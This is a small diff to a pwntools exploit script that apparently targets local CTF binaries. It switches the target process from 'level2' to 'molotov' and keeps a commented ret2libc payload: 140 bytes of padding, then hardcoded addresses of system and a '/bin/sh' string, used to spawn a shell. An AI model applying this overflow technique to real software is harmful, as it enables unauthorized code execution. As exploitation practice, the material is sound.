@@ -1,11 +1,11 @@
 import struct
-from pwn import*
+from pwn import *
 
 system=0xf7e195a0
 sh=0xf7f58b35
 ret=0xdeadbeef
 
-#p=process('./level2')
+p=process('./molotov')
 
 #exp= 'A'*140+struct.pack("I",system)+struct.pack("I",ret)+struct.pack("I",sh)
 
